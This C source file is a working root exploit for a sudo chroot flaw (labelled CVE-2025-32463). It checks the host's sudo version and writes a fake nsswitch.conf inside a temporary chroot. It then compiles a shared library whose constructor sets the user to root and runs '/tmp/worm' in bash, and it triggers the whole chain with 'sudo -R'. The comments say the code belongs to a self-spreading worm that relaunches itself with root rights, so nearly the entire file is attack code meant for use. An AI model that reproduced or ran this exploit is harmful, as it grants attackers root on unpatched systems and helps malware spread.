#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>
#include <errno.h>

// Breakdown of the last safe version for the CVE-2025-32463
#define SAFE_MAJOR 1
#define SAFE_MINOR 9
#define MIN_VULN_PATCH 14
#define MAX_VULN_PATCH 17
#define SAFE_SUBPATCH 1

/*
 * Following code will be executed as root. It is written down in one line for simplicity
 *
 * #include <stdlib.h>
 * #include <unistd.h>
 *
 * __attribute__((constructor)) void xoot(void)
 * {
 *       setreuid(0,0);
 *       setregid(0,0);
 *
 *       chdir("/");
 *
 *       execl("/bin/bash", "bash", "-i", "-c", "/tmp/worm &", NULL); // Executing another time the worm file with root privilegues 
 * }
*/
const char XOOT[] = "#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void xoot(void)\n{\n        setreuid(0,0);\n        setregid(0,0);\n\n        chdir(\"/\");\n\n        execl(\"/bin/bash\", \"bash\", \"-i\", \"-c\", \"/tmp/worm &\", NULL);\n}\n";

/*
 * Auxiliar function for running commands in C using execvp
*/
static void runCommand(char *argv[]) {
    pid_t p = fork();
    if (p == 0) {
        execvp(argv[0], argv);
        perror("execvp");
        _exit(1);
    }
    waitpid(p, NULL, 0);
}

/* 
 * Given a version, check whether the vulnerability "CVE-2025-32463" is exploitable.
 * Return 1 if vulnerable. Otherwise 0.
 * Note: Only 1.9.14 < 1.9.17p1 version are exploitable
*/
int is_version_vulnerable(int v_maj, int v_min, int v_patch, int v_sub) {

    // Check major version
    if (v_maj != 1) { return 0; }

    // Check minor version
    if (v_min != 9) { return 0; }

    // Check patch version
    if (v_patch < MIN_VULN_PATCH || v_patch > MAX_VULN_PATCH) { return 0; }

    // Check subpatch version
    if (v_patch == 17 && v_sub != 1) { return 0; }

    return 1;
}

/**
 * Scan for CVE-2025-32463 vulnerability
 * Checks if sudo version is vulnerable (1.9.14 < 1.9.17p1)
 * Returns 1 if vulnerable, 0 if not
 */
int cve_2025_32463_scan(void) {
    // 1. Check if sudo exists
    if (access("/usr/bin/sudo", F_OK) != 0) {
        return 0; // sudo not installed
    }

    // 2. Get sudo version
    FILE* fp = popen("sudo --version 2>&1 | head -1", "r");
    if (!fp) {
        perror("popen failed");
        return 0;
    }

    char version_line[256] = {0};
    if (!fgets(version_line, sizeof(version_line), fp)) {
        pclose(fp);
        return 0;
    }
    pclose(fp); // Cierra el pipe después de leer

    // 3. Parse version: "Sudo version 1.9.16" or "Sudo version 1.9.16p1"
    int major = 0, minor = 0, patch = 0, subpatch = 0;

    // Readig the versions with certains paterns
    int count = sscanf(version_line, "Sudo version %d.%d.%dp%d", &major, &minor, &patch, &subpatch);
    
    if (count < 3) {
        // There is no subpatch
        count = sscanf(version_line, "Sudo version %d.%d.%d", &major, &minor, &patch);
        if (count < 3) {
            // No se pudo parsear
            fprintf(stderr, "Error: Cannot parse Sudo version from: %s\n", version_line);
            return 0;
        }
    }
    
    // 4. Check if version is vulnerable
    // Vulnerable versions: 1.9.14 hasta 1.9.17p0
    return is_version_vulnerable(major, minor, patch, subpatch);
}

/*
 * Main function
*/
int cve_2025_32463_execute(void) {

    // Create temp folder - The Xs will be replaced by random characters
    char stage[] = "/tmp/sudo.stage.XXXXXX";

    // Check if folder is not already created
    while (!mkdtemp(stage)) {
        if (errno != EEXIST) {
            perror("mkdtemp");
            return 1;
        }
        // Delete the folder if it is created
        runCommand((char *[]){"rm", "-rf", stage, NULL});
    }

    // Change directory to the temp folder created
    chdir(stage);

    // Copy the code for getting root privileges into a new file
    FILE *f = fopen("xoot.c", "w");
    if (f == NULL) {
        perror("fopen");
        return 1;
    }

    fprintf(f, XOOT);
    fclose(f);

    // Creation of structure folders
    runCommand((char *[]){"mkdir", "-p", "xoot/etc", "libnss_", NULL});

    // Configuring custom NSS module
    // NSS will interpret /xoot as a custom service
    runCommand((char *[]){"sh", "-c", "echo 'passwd: /xoot' > xoot/etc/nsswitch.conf", NULL});

    // If the file /etc/group doesn't exist inside chroot, the exploit will be aborted
    // This is because sudo also needs to know things such as the groups an user belogs to
    runCommand((char *[]){"cp", "/etc/group", "xoot/etc", NULL});

    // Compiles the file xoot.c as a shared library (.so)
    // The function xoot will be automaticlly called after loading the library
    runCommand((char *[]){"gcc", "-shared", "-fPIC", "-Wl,-init,xoot", "-o", "libnss_/xoot.so.2", "xoot.c", NULL});

    // Root permission granted. -R = --chroot
    runCommand((char *[]){"sudo", "-R", "xoot", "xoot", NULL});
    runCommand((char *[]){"rm", "-rf", stage, NULL});

    return 0;
}
